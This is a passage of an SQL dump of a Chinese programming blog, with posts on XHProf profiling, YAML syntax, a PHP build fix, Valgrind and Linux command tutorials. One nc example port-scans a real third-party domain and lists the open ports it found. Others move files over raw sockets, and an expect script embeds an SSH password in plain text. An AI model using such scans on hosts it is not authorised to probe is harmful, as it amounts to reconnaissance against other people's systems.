注意，如果使用`XHPROF_FLAGS_CPU`选项对CPU占用也进行分析，在Linux环境下，会造成比较高的系统负载，因此不建议使用，而推荐只使用`XHPROF_FLAGS_MEMORY`，对内存的分析不会对系统造成太多负载。\r\n\r\n####形象化的查看分析结果\r\n\r\n使用`xhprof_disable`完成性能分析并且获取到分析结果之后，我们通常不会直接输出结果，因为这样的结果是以数组形式组织的，看起来并不直观，幸运的是，xhprof提供了基于web的图形界面对分析结果进行查看。\r\n\r\n在使用之前，请先确保服务器安装了`graphviz`工具，否则在生成监控图表的时候回出现以下错误:\r\n```html\r\nfailed to execute cmd: " dot -Tpng". stderr: `sh: dot: command not found ''\r\n```\r\n这里提示找不到`dot`命令，所以需要先安装`graphviz`\r\n```bash\r\n$ sudo yum install graphviz\r\n```\r\n\r\n由于分析结果的查看工具是基于web的，因此，我们需要将xhprof安装包中的**xhprof_html**和**xhprof_lib**目录放到服务器的web目录下，让xhprof_html目录中的内容对外可以访问。\r\n\r\n比如我的测试服务器环境是使用vagrant搭建的Cent OS，我见过这两个目录放到**/vagrant/xhprof**目录下：\r\n```bash\r\n[vagrant@localhost xhprof]$ pwd\r\n/vagrant/xhprof\r\n[vagrant@localhost xhprof]$ ls\r\nxhprof_html  xhprof_lib\r\n```\r\n\r\nweb服务器使用的是Nginx，因此，在Nginx的配置文件`nginx.conf`中的配置如下：\r\n```bash\r\nserver {\r\n    listen       80;\r\n    server_name  _;\r\n    root /vagrant;\r\n    ...\r\n```\r\n\r\nweb服务器的根目录是/vagrant，因此访问地址为`http://localhost/xhprof/xhprof_html/index.php`.\r\n\r\n当然，配置好环境之后，我们还是获取不到分析结果的，因为我们在代码中并没有将分析结果保存到`xhprof.output_dir`指定的目录中。\r\n\r\n因此，我们需要修改我们的代码，是其能够将分析结果存放到`xhprof.output_dir`指定的目录中。\r\n\r\n```php\r\n....\r\n$xhprofData = xhprof_disable();\r\nrequire ''/vagrant/xhprof/xhprof_lib/utils/xhprof_lib.php'';\r\nrequire ''/vagrant/xhprof/xhprof_lib/utils/xhprof_runs.php'';\r\n\r\n$xhprofRuns = new XHProfRuns_Default();\r\n$runId = $xhprofRuns->save_run($xhprofData, ''xhprof_test'');\r\n\r\necho ''http://localhost/xhprof/xhprof_html/index.php?run='' . $runId . ''&source=xhprof_test'';\r\n```\r\n\r\n变量`$runId`是本次请求生成分析结果的id，最后我们输出了一个链接地址，使用改地址就可以看到本次请求的分析结果。\r\n\r\n![分析结果](http://agiledev-arsenals.stor.sinaapp.com/photos/64b625303c3517f5c7a1ea8e6c018013.png)\r\n\r\n注意到中间的`View Full Callgraph`链接，通过该链接我们可以看到图形化的分析结果。\r\n\r\n![图形化分析结果](http://agiledev-arsenals.stor.sinaapp.com/photos/20120c0a37e30062657eba98c723c354.png)\r\n\r\n图中红色的部分为性能比较低，耗时比较长的部分，我们可以根据根据哪些函数被标记为红色对系统的代码进行优化', 'XHProf是facebook 开发的一个测试php性能的扩展。\r\n', 'http://agiledev-arsenals.stor.sinaapp.com/cover/thumb_small/fb88f0e8838790597c0a91c590a892a6.jpeg', 'mylxsw', '原创', 1, 0, 1419157551, NULL, NULL, 'markdown'),
(409, 'CentOS 安装PHP5.6出错set --enable-opcache=no', '编译PHP5.6出现以下错误： \r\n\r\n```bash\r\nDon''t know how to define struct flock on this system, set --enable-opcache=no\r\n```\r\n\r\n提示无法启用opcache，在stackoverflow下找到答案\r\n\r\n```bash\r\n$ sudo sh -c ''echo /usr/local/lib > /etc/ld.so.conf.d/local.conf''\r\n$ sudo ldconfig -v\r\n```', 'Don''t know how to define struct flock on this system, set --enable-opcache=no', 'http://agiledev-arsenals.stor.sinaapp.com/cover/aa29571ccac80268a197bce2b1ffbd34.jpg', 'mylxsw', '转载', 1, 0, 1419505156, 1419929212, 0, 'markdown'),
(413, 'YAML格式', '\r\n根据官方的YAML站点所述，YAML是面向所有编程语言的对人类友好的数据序列化标准。\r\n\r\n尽管YAML格式可以描述复杂的嵌套数据结构，但是本章节只会描述使用YAML作为配置文件格式所需要的最小化的特性。\r\n\r\nYAML是用于描述数据的一款简单的语言。对于PHP，它可以描述简单的数据类型如string，boolean，floats或者integer等。但是在数组（序列）和哈希（映射）上与PHP是不同的。\r\n\r\n####标量\r\n\r\n标量数据类型语法与PHP语法类似。\r\n\r\n####字符串\r\n\r\n在YAML中，字符串可以包含在单引号或者双引号之间，当然，有时也可以不用引号包含。\r\n\r\n    A string in YAML\r\n    ''A singled-quoted string in YAML''\r\n    "A double-quoted string in YAML"\r\n\r\n使用引号包含的样式在字符串内容的开始或者结束位置含有空格的情况下是非常有用的，因为对于不加引号的字符串来说，在解析它们的内容的时候，会去掉前后的空格。在字符串中包含特殊字符或者保留字符的情况下，需要使用引号包含。\r\n\r\n在使用单引号`''`的情况下，内容中任何单引号必须使用两个单引号转义。\r\n\r\n	''A single quote '''' inside a single-quoted string''\r\n\r\n包含下列任意字符的字符串必须被引号包含。尽管你可以使用双引号`"`，但是，对于下列这些字符来说，最好使用单引号`''`，这样可以避免使用反斜线`\\` 对他们转义：\r\n\r\n	:, {, }, [, ], ,, &, *, #, ?, |, -, <, >, =, !, %, @, \\`\r\n\r\n双引号的样式提供了一种用于表述任意字符串的方式，通过使用`\\`转义字符或者序列。例如，当需要嵌入一个`\\n`或者Unicode字符时双引号是非常有用的。\r\n\r\n	"A double-quoted string in YAML\\n"\r\n\r\n如果字符串包含下列任意控制字符，必须使用双引号才能转义\r\n\r\n	\\0, \\x01, \\x02, \\x03, \\x04, \\x05, \\x06, \\a, \\b, \\t, \\n, \\v, \\f, \\r, \\x0e, \\x0f, \\x10, \\x11, \\x12, \\x13, \\x14, \\x15, \\x16, \\x17, \\x18, \\x19, \\x1a, \\e, \\x1c, \\x1d, \\x1e, \\x1f, \\N, \\_, \\L, \\P\r\n\r\n最后，下列这些情况下，字符串必须使用引号包含：\r\n\r\n- 当字符串是`true`或者`false`时（否则会被认为是boolean值）\r\n- 当字符串是`null`或者`~`（否则会被认为是null）\r\n- 当字符串看起来是数字，例如整数(2, 14等)，浮点数(2.6，14.9等)，指数(12e7等)（否则它们会被认为是数字值）\r\n- 当字符串看起来是个日期（例如2014-12-31）（否则它们会被自动转义成UNIX时间戳）\r\n\r\n当字符串包含换行的时候，可以使用字面值样式，管道符号(`|`)表明字符串将跨越多行，在字面值样式下，换行符被保留。\r\n\r\n    |\r\n      \\/ /| |\\/| |\r\n      / / | |  | |__\r\n\r\n可选的，字符串也可以使用折叠样式，以`>`开始，接下来没一行都以空格开始。\r\n\r\n    >\r\n      This is a very long sentence\r\n      that spans several lines in the YAML\r\n      but which will be rendered as a string\r\n      without carriage returns.\r\n\r\n> 注意，上述例子中，没一行都有两个空格，它们并不会在最终的结果中显示。\r\n\r\n####数字\r\n\r\n    # an integer\r\n    12\r\n\r\n    # an octal\r\n    014\r\n\r\n    # an hexadecimal\r\n    0xC\r\n\r\n    # a float\r\n    13.4\r\n\r\n    # an exponential number\r\n    1.2e+34\r\n\r\n    # infinity\r\n    .inf\r\n\r\n####Null\r\n\r\n在YAML中，可以使用`null`或者`~`表示NULL。\r\n\r\n####Boolean\r\n\r\n在YAML中，使用`true`和`false`表示boolean值。\r\n\r\n####日期\r\n\r\nYAML使用ISO-8601标准表示日期格式。\r\n\r\n	2001-12-14t21:59:43.10-05:00\r\n\r\n	# simple date\r\n	2002-12-14\r\n\r\n####集合\r\n\r\n一个YAML文件很少只用来表述简单的标量类型数据。大多数时候，它会用来描述一个集合。集合可以是一个序列或者是元素的映射。在PHP数组中，序列和映射都存在。\r\n\r\n序列使用`-`和一个空格开始\r\n\r\n    - PHP\r\n    - Perl\r\n    - Python\r\n\r\n上述例子与下列PHP代码等价：\r\n\r\n	array(''PHP'', ''Perl'', ''Python'');\r\n\r\n映射是使用`:`分隔的键值对\r\n\r\n    PHP: 5.2\r\n    MySQL: 5.1\r\n    Apache: 2.2.20\r\n\r\n上述与下面的PHP代码类似\r\n\r\n	array(''PHP'' => 5.2, ''MySQL'' => 5.1, ''Apache'' => ''2.2.20'');\r\n\r\n> 在映射中，key可以是任意合法的标量。\r\n\r\n在`:`和值之间的空格是任意的\r\n\r\n    PHP:    5.2\r\n    MySQL:  5.1\r\n    Apache: 2.2.20\r\n\r\nYAML使用空格缩进描述嵌套的集合\r\n\r\n    "symfony 1.0":\r\n      PHP:    5.0\r\n      Propel: 1.2\r\n    "symfony 1.2":\r\n      PHP:    5.2\r\n      Propel: 1.3\r\n\r\n下面的PHP代码与上述的YAML等价\r\n\r\n    array(\r\n      ''symfony 1.0'' => array(\r\n        ''PHP''    => 5.0,\r\n        ''Propel'' => 1.2,\r\n      ),\r\n      ''symfony 1.2'' => array(\r\n        ''PHP''    => 5.2,\r\n        ''Propel'' => 1.3,\r\n      ),\r\n    );\r\n\r\n需要注意的是，在YAML文件中，必须使用一个或者多个空格进行缩进，而不能使用TAB制表符。\r\n\r\n也可以嵌套使用序列或者映射\r\n\r\n    ''Chapter 1'':\r\n      - Introduction\r\n      - Event Types\r\n    ''Chapter 2'':\r\n      - Introduction\r\n      - Helpers\r\n\r\n序列也可以使用方括号`[]`中逗号(`,`)分隔表示\r\n\r\n	[PHP, Perl, Python]\r\n\r\n映射可以使用花括号`{}`中使用`,`分隔键值对\r\n\r\n	{ PHP: 5.2, MySQL: 5.1, Apache: 2.2.20 }\r\n\r\n你可以混合搭配各种样式实现更好的可读性\r\n\r\n    ''Chapter 1'': [Introduction, Event Types]\r\n    ''Chapter 2'': [Introduction, Helpers]\r\n\r\n    "symfony 1.0": { PHP: 5.0, Propel: 1.2 }\r\n    "symfony 1.2": { PHP: 5.2, Propel: 1.3 }\r\n\r\n####注释\r\n\r\n在YAML中使用`#`开始表示注释内容：\r\n\r\n    # Comment on a line\r\n    "symfony 1.0": { PHP: 5.0, Propel: 1.2 } # Comment at the end of a line\r\n    "symfony 1.2": { PHP: 5.2, Propel: 1.3 }\r\n\r\n> YAML将会在解析的时候忽略注释，注释内容是不需要根据嵌套级别进行缩进的。\r\n\r\n\r\n原文：[The YAML Format](http://symfony.com/doc/current/components/yaml/yaml_format.html)', '本文翻译自Symfony 2 官方文档节选', 'http://agiledev-arsenals.stor.sinaapp.com/cover/thumb_small/ec67589372d8b16c8af622daeeb77a68.png', 'mylxsw', '翻译', 1, 0, 1421132259, NULL, NULL, 'markdown'),
(412, 'Mac/Linux查看文件MIME-TYPE', '在Mac下使用file命令查看文件真实的MIME TYPE\r\n\r\n```bash\r\n$ file --mime-type SJ-174IMG.bmp \r\nSJ-174IMG.bmp: image/jpeg\r\n\r\n$ file --mime-type SJ-174IMG.jpg \r\nSJ-174IMG.jpg: image/jpeg\r\n\r\n$ file --mime-type SJ-174IMG.jpeg\r\nSJ-174IMG.jpeg: image/png\r\n\r\n```', '在Mac下使用file命令查看文件真实的MIME TYPE', 'http://agiledev-arsenals.stor.sinaapp.com/cover/2ee9ae81a18573688aed964999620ac8.jpg', 'mylxsw', '原创', 1, 0, 1420615864, NULL, NULL, 'markdown'),
(406, '实用Linux命令集锦 （一）', '####top命令\r\n监控系统的运行状态，并且可以按照cpu、内存、执行时间进行排序。\r\n\r\n![监控界面](http://agiledev-arsenals.stor.sinaapp.com/photos/2a9d0fffcd53d3c8405a8213f021c2de.png)\r\n\r\n第一行中，`03:30:22`是当前时间，`up 39 min`是系统运行的运行了多长时间，`1 user`指出了当前有几个用户登录到系统，`load average`指的是系统负载，这后面的三个值分别是1分钟，5分钟，15分钟的系统负载平均值。\r\n\r\n> 如果仅仅需要第一行中的信息，可以使用`uptime`命令。\r\n\r\n第二行中，`Task`指出了当前系统有多少个进程，以及各种状态的进程统计信息。\r\n\r\n第三行是`%Cpu(s)`，代表了CPU占用比例，其中：\r\n\r\n- **us** 用户模式(*user* mode)\r\n- **sy** 系统模式(*system* mode)\r\n- **ni** 优先值(low priority user mode(*nice*))\r\n- **id** 空闲CPU百分比(*idle* task)\r\n- **wa** 等待输入输出的CPU事件百分比(I/O *waiting*)\r\n- **hi** servicing IRQs\r\n- **si** servicing soft IRQs\r\n- **st** *steal* (time given to other DomU instances)\r\n\r\n> **ni**是优先值(nice value)，也就是任务的优先值。优先值为负数，则说明任务有更高的优先级，正数值说明任务有更低的优先级，该值为0意味着进程都优先级没有调整。\r\n\r\n最后两行为内存信息，前者`Mem`为物理内存占用信息，后者`Swap`为交换分区占用信息。\r\n\r\n> 使用`-M`参数可以更加友好的显示内存占用信息。默认是以kb展示的，看起来比较费劲，使用`-M`之后会根据数值大小，以G/M为单位展示。\r\n\r\n最下面是进程的信息区域：\r\n\r\n- **PID** 进程的PID\r\n- **USER** 用户名，任务属主\r\n- **PR** 任务的优先级\r\n- **NI** 优先值\r\n- **VIRT** 虚拟映像（kb），任务当前使用的虚拟内存数量\r\n- **RES** 常驻物理内存占用量，RES=CODE+DATA\r\n- **SHR** 共享内存大小（kb）\r\n- **S** 进程状态（D-不可中断的睡眠，R-运行，S-睡眠，T-停止，Z-僵尸进程）\r\n- **%CPU** CPU使用量\r\n- **%MEM** 内存使用量\r\n- **TIME+** CPU时间，百分之一\r\n- **COMMAND** 程序名称\r\n\r\n> 参考[linux top命令详解](http://blog.csdn.net/sanshiqiduer/article/details/1933625)\r\n\r\n-----------\r\n####pgrep/pkill 命令\r\n根据名称或者其它属性查询（发送信号）进程信息。\r\n\r\n`pgrep`命令根据提供的条件查询进程的pid，查询条件是and方式的，对于同一个选项，使用『,』分隔可以按照or方式查询。\r\n\r\n```bash\r\npgrep -u root sshd   # 查询进程名为sshd，并且属主是root的进程\r\npgrep -u root,daemon # 查询属主是root或者daemon的进程\r\n```\r\n\r\n`pkill` 使用与`pgrep`类似，不过它不是用来查询进程pid，而是给进程发送信号，默认会发送 **SIGTERM**信号。\r\n\r\n例如:\r\n```bash\r\n$ pgrep -u root named # 查找named进程的pid\r\n$ pkill -HUP syslogd  # 告诉syslogd重新读取配置文件\r\n```\r\n\r\n> 要查看有哪些信号可用，可以使用`kill -l`列出所有的信号以及其数值。\r\n\r\n\r\n-----------\r\n####except命令\r\n\r\n\r\n- **send** 发送一个字符串给进程。\r\n- **expect** 等待来自进程返回的字符串。\r\n- **spawn** 开始一个命令。\r\n\r\n#####实现控制台SSH直接登陆Linux服务器\r\n\r\n```bash\r\n#!/usr/bin/expect\r\n\r\nset timeout 20\r\n\r\nset ip "IP地址"\r\nset user "用户名"\r\nset password "密码"\r\n\r\nspawn ssh "$user\\@$ip"\r\n\r\nexpect "$user@$ip''s password:"\r\nsend "$password\\r"\r\n\r\ninteract\r\n```\r\n> 参考 [6 Expect Script Examples to Expect the Unexpected (With Hello World)\r\n](http://www.thegeekstuff.com/2010/10/expect-examples/)\r\n\r\n-----------\r\n####pstack命令\r\n`pstack`是一个shell脚本，用于打印正在运行的进程的栈跟踪信息，它实际上是`gstack`的一个链接。\r\n\r\n该命令只需要提供一个参数，进程的pid即可。\r\n```bash\r\n$ sudo pstack $(pgrep -uroot php-fpm)\r\n[sudo] password for guanyy:\r\n#0  0x000000380d8e86f3 in __epoll_wait_nocancel () from /lib64/libc.so.6\r\n#1  0x00000000007ec4a4 in fpm_event_epoll_wait ()\r\n#2  0x00000000007e1517 in fpm_event_loop ()\r\n#3  0x00000000007dc887 in fpm_run ()\r\n#4  0x00000000007e3bd8 in main ()\r\n```\r\n\r\n-----------\r\n####strace命令\r\n`strace`命令用于跟踪系统调用和信号。主要用于诊断，调试程序，使用该命令能够打印出进程执行的系统调用信息。\r\n\r\n#####找出应用程序启动时读取的配置文件\r\n```bash\r\n$ strace php 2>&1 | grep php.ini\r\nopen("/usr/local/bin/php.ini", O_RDONLY) = -1 ENOENT (No such file or directory)\r\nopen("/usr/local/lib/php.ini", O_RDONLY) = 4\r\nlstat64("/usr/local/lib/php.ini", {st_mode=S_IFLNK|0777, st_size=27, ...}) = 0\r\nreadlink("/usr/local/lib/php.ini", "/usr/local/Zend/etc/php.ini", 4096) = 27\r\nlstat64("/usr/local/Zend/etc/php.ini", {st_mode=S_IFREG|0664, st_size=40971, ...}) = 0\r\n```\r\n\r\n> 这里的`2>&1` 是将标准错误输出重定向到标准输出。\r\n\r\n#####查找为什么程序没有打开指定文件\r\n```bash\r\n$ strace -e open,access 2>&1 |grep your-filename\r\n```\r\n\r\n`-e`参数指定了一个限定表达式用于指定要跟踪的事件和如何跟踪它们。\r\n```bash\r\n[qualifier=][!]value1[,value2]...\r\n```\r\n\r\n这里的`qualifier`可选值为: `trace`, `abbrev`, `verbose`, `raw`, `signal`, `read`, `write`。默认的`qualifier`是`trace`。\r\n\r\n#####查看进程正在执行什么操作\r\n```bash\r\nroot@dev:~# strace -p 15427\r\nProcess 15427 attached - interrupt to quit\r\nfutex(0x402f4900, FUTEX_WAIT, 2, NULL \r\nProcess 15427 detached\r\n```\r\n\r\n`-p`指定了strace跟踪的进程的pid，这样就避免了每次执行strace时需要重启程序。\r\n\r\n#####查看进程的哪些操作比较耗时\r\n```bash\r\nroot@dev:~# strace -c -p 11084\r\nProcess 11084 attached - interrupt to quit\r\nProcess 11084 detached\r\n% time     seconds  usecs/call     calls    errors syscall\r\n------ ----------- ----------- --------- --------- ----------------\r\n 94.59    0.001014          48        21           select\r\n  2.89    0.000031           1        21           getppid\r\n  2.52    0.000027           1        21           time\r\n------ ----------- ----------- --------- --------- ----------------\r\n100.00    0.001072                    63           total\r\n```\r\n\r\n`-c`参数用于统计进程做了哪些系统调用，调用的时间统计等，并对这些信息做一个汇总显示。\r\n\r\n#####查看为什么xxx无法连接到服务器\r\n```bash\r\n$ strace -e poll,select,connect,recvfrom,sendto nc www.news.com 80\r\nsendto(3, "\\\\24\\\\0\\\\0\\\\0\\\\26\\\\0\\\\1\\\\3\\\\255\\\\373NH\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0", 20, 0, {sa_family=AF_NETLINK, pid=0, groups=00000000}, 12) = 20\r\nconnect(3, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)\r\nconnect(3, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)\r\n...\r\n```\r\n\r\n\r\n> 参考[5 simple ways to troubleshoot using Strace](http://www.hokstad.com/5-simple-ways-to-troubleshoot-using-strace)\r\n\r\n-----\r\n####nc命令\r\n该命令用于创建任意的TCP/UDP连接或者是监听连接。\r\n\r\n#####建立一个基本的C/S模型(文件远程复制)\r\n在Server1上，使用nc命令创建一个服务端：\r\n```bash\r\nserver1 $ nc -l 1234\r\n```\r\n\r\n在Server2上，使用nc作为客户端连接到server1\r\n```bash\r\nserver2 $ nc server1的IP地址 1234\r\n```\r\n\r\n这样就建立起一个简单的C/S连接，在server2中输入任何内容，在server1都可以接受到（同步显示）。\r\n\r\n上面的例子可以改造实现文件远程发送\r\n```bash\r\nserver1 $ nc -l 1234 > filename.out\r\n```\r\n在server2上\r\n```bash\r\nserver2 $ nc server1的IP地址 1234 < filename.in\r\n```\r\n\r\n> `-l` 指定了nc应该作为server端监听指定的端口\r\n\r\n#####模拟HTTP请求\r\n```bash\r\n# echo -n "GET / HTTP/1.0\\r\\n\\r\\n" | nc php.net 80\r\nHTTP/1.1 400 Bad Request\r\nServer: nginx/1.6.2\r\nDate: Tue, 16 Dec 2014 08:09:35 GMT\r\nContent-Type: text/html\r\nContent-Length: 172\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body bgcolor="white">\r\n<center><h1>400 Bad Request</h1></center>\r\n<hr><center>nginx/1.6.2</center>\r\n</body>\r\n</html>\r\n```\r\n\r\n#####端口扫描\r\n端口扫描的作用还是比较大的，使用`nc`可以方便的进行端口扫描。\r\n```bash\r\n# nc -z letv.com 1-100\r\nConnection to letv.com 22 port [tcp/ssh] succeeded!\r\nConnection to letv.com 80 port [tcp/http] succeeded!\r\n```\r\n\r\n这里的`1-100`指定了扫描的端口范围，`-z`参数告诉nc命令只报告开放的端口。\r\n\r\n> 默认`nc`命令发送的是tcp请求，通过指定参数`-u`可以发送udp请求。\r\n\r\n#####目录传输\r\n\r\n下面例子中，将server2的phpredis-master目录拷贝到server1。\r\n\r\nserver1:\r\n```bash\r\n# nc -l 1234|tar zxvf -\r\n```\r\n\r\nserver2:\r\n```bash\r\n# tar zcvf - phpredis-master|nc server1的IP地址 1234\r\n```\r\n\r\n> 参考[Linux nc命令详解](http://blog.csdn.net/wang7dao/article/details/7684998)\r\n\r\n-----\r\n####pstree命令\r\n该命令用于显示进程树，以树的形式显示正在运行的进程，树的根节点是指定的pid（忽略则为init进程）。\r\n\r\n```bash\r\n[root@cdn ~]# pstree -p $(pgrep -uroot php-fpm)\r\nphp-fpm(5445)─┬─php-fpm(5446)\r\n              ├─php-fpm(5447)\r\n              ├─php-fpm(5448)\r\n              ├─php-fpm(7540)\r\n              ├─php-fpm(21639)\r\n              └─php-fpm(24727)\r\n```\r\n\r\n\r\n-----\r\n####ss命令\r\n`ss`命令用于显示socket的统计信息。\r\n\r\n#####显示socket的汇总信息\r\n\r\n`-s`选项用于显示汇总信息。\r\n\r\n```bash\r\n# ss -s\r\nTotal: 247 (kernel 290)\r\nTCP:   214 (estab 68, closed 130, orphaned 0, synrecv 0, timewait 130/0), ports 135\r\n\r\nTransport Total     IP        IPv6\r\n*	  290       -         -\r\nRAW	  0         0         0\r\nUDP	  11        7         4\r\nTCP	  84        81        3\r\nINET	  95        88        7\r\nFRAG	  0         0         0\r\n```\r\n\r\n#####查看所有打开的网络端口\r\n\r\n`-l`选项用于列出当前正在监听的socket。\r\n\r\n```bash\r\n# ss -l\r\nState      Recv-Q Send-Q      Local Address:Port          Peer Address:Port   \r\nLISTEN     0      128             127.0.0.1:smux                     *:*       \r\nLISTEN     0      128             127.0.0.1:9000                     *:*       \r\nLISTEN     0      50                      *:3306                     *:*       \r\nLISTEN     0      1024                   :::11211                   :::*       \r\n```\r\n\r\n使用`ss -pl`可以查看使用网络端口的进程名称，这里的`-p`选项用于显示进程信息。\r\n```bash\r\n# ss -pl\r\nState      Recv-Q Send-Q      Local Address:Port          Peer Address:Port   \r\nLISTEN     0      128             127.0.0.1:smux                     *:*        users:(("snmpd",1256,8))\r\nLISTEN     0      50                      *:3306                     *:*        users:(("mysqld",17651,10))\r\nLISTEN     0      1024                   :::11211                   :::*        users:(("memcached",1849,34))\r\nLISTEN     0      1024                    *:11211                    *:*        users:(("memcached",1849,33))\r\nLISTEN     0      511             127.0.0.1:6379                     *:*        users:(("redis-server",1403,4))\r\n```\r\n\r\n> 使用`ss -pl|grep 端口号`查看端口被那个进程占用。\r\n\r\n#####显示所有的TCP/UDP Socket\r\n\r\n参数`-a`(`--all`)用于显示所有的socket，`-t`指的是TCP， `-u`是UDP, `-w`是RAW, `-x`是UNIX。\r\n\r\n```bash\r\n# ss -t -a\r\n# ss -u -a\r\n# ss -w -a\r\n# ss -x -a\r\n```\r\n\r\n\r\n\r\n> 参考[ss: Display Linux TCP / UDP Network and Socket Information\r\n](http://www.cyberciti.biz/tips/linux-investigate-sockets-network-connections.html)\r\n\r\n\r\n-----\r\n####w/who命令\r\n`w`命令用于查看当前哪些用户登录到系统和他们正在做什么，`who`命令仅用于查看哪些用户登录系统。\r\n\r\n```bash\r\n# w\r\n 15:39:08 up 126 days, 22:35,  3 users,  load average: 0.02, 0.05, 0.02\r\nUSER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT\r\nroot     pts/0    10.58.92.228     13:29    1:35m  0.03s  0.03s -bash\r\nroot     pts/1    10.58.93.56      10:32    5:06m  0.00s  0.00s -bash\r\nroot     pts/4    10.58.88.20      12:29    0.00s  0.20s  0.00s w\r\n# who\r\nroot     pts/0        2014-12-18 13:29 (10.58.92.228)\r\nroot     pts/1        2014-12-18 10:32 (10.58.93.56)\r\nroot     pts/4        2014-12-18 12:29 (10.58.88.20)\r\n```\r\n\r\n\r\n-----\r\n####iostat\r\n报告CPU的统计信息，设备、分区、网络文件系统（NFS）的I/O统计信息。\r\n\r\n```bash\r\n# iostat\r\nLinux 2.6.32-903.279.9.1.el6.x86_64 (localhost) 	2014年12月18日 _x86_64_	(2 CPU)\r\n\r\navg-cpu:  %user   %nice %system %iowait  %steal   %idle\r\n           0.35    0.00    0.34    0.42    0.15   98.74\r\n\r\nDevice:            tps   Blk_read/s   Blk_wrtn/s   Blk_read   Blk_wrtn\r\nvda               4.01         0.35        56.76    3866731  622586087\r\ndm-0              3.29         0.09        26.33     989378  288796192\r\ndm-1              3.45         0.05        27.60     554922  302727584\r\ndm-2              0.32         0.21         2.83    2296845   31060799\r\n```\r\n\r\n这里对几个性能指标进行解释：\r\n\r\n- **tps** 每秒发送的I/O请求数\r\n- **Blk_read/s** 每秒读取的block数\r\n- **Blk_wrtn/s** 每秒写入的block数\r\n- **Blk_read** 读取的block数\r\n- **Blk_wrtn** 写入的block数\r\n\r\n> 通过指定`-d`参数可以设定自动按照指定时间间隔显示统计信息。例如，下列命令每隔2s显示一次。\r\n```bash\r\n$ iostat -d 2\r\n```\r\n\r\n-----\r\n####iptraf 命令：实时网络统计\r\n交互式的IP网络实时监控工具，图形化界面，比较方便。\r\n```bash\r\n# iptraf\r\n```\r\n\r\n界面如下:\r\n![iptraf](http://agiledev-arsenals.stor.sinaapp.com/photos/31368e2f080a394bfdf266126dbc5807.png)\r\n\r\n> 参考[20 Linux System Monitoring Tools Every SysAdmin Should Know](http://www.cyberciti.biz/tips/top-linux-monitoring-tools.html)', '本文是Linux实用命令集锦的第一部分，收集了常用的Linux命令，根据本人是学习的进度，不断更新。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/68dd5b2d9a280c19042ba933d34be2f1.jpg', 'mylxsw', '原创', 1, 0, 1418893568, 1418894732, 0, 'markdown'),
(414, 'Mac OS 10.10安装Valgrind', '在Mac Os 10.10上安装Valgrind，使用brew发现不支持当前系统，从官网下载源码编译也提示不支持该系统内核。\r\n\r\n在 [Valgrind support for MacOS X 10.10 (Yosemite)](http://blog.mozilla.org/jseward/2015/01/14/valgrind-support-for-macos-x-10-10-yosemite/?utm_source=tuicool) 这篇文章中找到了答案，可以从svn拉去最新的代码，最新的代码支持10.10系统。\r\n\r\n    $ svn co svn://svn.valgrind.org/valgrind/trunk valgrind-trunk\r\n    $ cd valgrind-trunk/\r\n    $ ./autogen.sh\r\n    $ ./configure --prefix=/usr/local\r\n    $ make -j8\r\n    $ sudo make -j8 install\r\n\r\n这样就安装成功了\r\n\r\n    $ valgrind --version\r\n    valgrind-3.11.0.SVN\r\n\r\n~END', '在Mac Os 10.10上安装Valgrind，使用brew发现不支持当前系统，从官网下载源码编译也提示不支持该系统内核。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/thumb_small/ebe36902a95fdb040dfc074cfe454184.png', 'mylxsw', '原创', 1, 0, 1421682859, 1421682951, 0, 'markdown'),
(415, '实用Linux命令集锦 （二）', '\r\n####查看Linux的版本（Red Hat/Cent OS）\r\n\r\n在RedHat和Cent OS下，使用如下命令查看当前系统的版本。\r\n\r\n    $ cat /etc/centos-release \r\n    CentOS release 6.3 (Final)\r\n\r\n\r\n####time命令： 统计程序执行时间\r\n\r\n用于统计程序执行时间，这些事件包含程序从被调用到终止的时间，用户CPU时间，系统CPU时间。\r\n\r\n    $ time ls\r\n    bakup                PDO-1.0.3.tgz     rinetd.tar.gz     yaf-2.2.9.tgz\r\n    channel.xml          package2.xml      PDO_MYSQL-1.0.2      xhprof-0.9.4      zendopcache-7.0.3\r\n    go-pear.phar         package.xml       PDO_MYSQL-1.0.2.tgz  xhprof-0.9.4.tgz  zendopcache-7.0.3.tgz\r\n    PDO-1.0.3            rinetd            yaf-2.2.9\r\n\r\n    real    0m0.002s\r\n    user    0m0.000s\r\n    sys 0m0.001s\r\n\r\n####tee命令\r\n\r\n`tee`命令用于将标准输入拷贝到标准输出。\r\n\r\n    $ echo "hello,world"|tee -a test.txt\r\n\r\n上述命令将hello,world字符串输出到test.txt文件中,**-a** 默认情况下，`tee`命令会使用`>`覆盖输出到文件，使用-a属性，会使用`>>`追加方式\r\n\r\n####netstat命令\r\n\r\n查看端口占用情况\r\n\r\n    # netstat -apn\r\n\r\n- **-a**（--all） 显示所有的socket信息（包括监听和未监听）\r\n- **-p**（--program） 显示每个socket所属于的进程名称和PID\r\n- **-n**（--numeric） 显示数字形式的地址而不是符号化的主机名、端口或者用户名\r\n\r\n\r\n####perf命令\r\n\r\n`perf`命令是随Linux内核代码一同发布和维护的性能诊断工具，由内核社区负责维护和发展。Perf不仅可以用于应用程序性能统计分析，也可以应用于内核代码的的性能统计和分析。\r\n\r\n在Cent OS系统上，如果没有该命令的话，可以使用yum进行安装。\r\n\r\n    # yum install perf\r\n\r\n`perf`命令非常强大，详细介绍的话篇幅比较长，可以阅读这篇文章 [Perf -- Linux下的系统性能调优工具][]。\r\n\r\n    用法: perf [--version] [--help] COMMAND [ARGS]\r\n\r\n     最常用的perf命令:\r\n       annotate        读取perf.data (使用perf record创建)文件并且显示标注的代码\r\n       archive         Create archive with object files with build-ids found in perf.data file\r\n       bench           进行基准测试的框架工具集\r\n       buildid-cache   Manage build-id cache.\r\n       buildid-list    List the buildids in a perf.data file\r\n       diff            Read perf.data files and display the differential profile\r\n       evlist          List the event names in a perf.data file\r\n       inject          Filter to augment the events stream with additional information\r\n       kmem            Tool to trace/measure kernel memory(slab) properties\r\n       kvm             Tool to trace/measure kvm guest os\r\n       list            列出所有事件类型的符号\r\n       lock            分析锁事件\r\n       mem             分析对内存的访问\r\n       record          运行一个命令并且记录它的分析结果到perf.data文件中\r\n       report          读取perf.data文件并且显示分析结果\r\n       sched           Tool to trace/measure scheduler properties 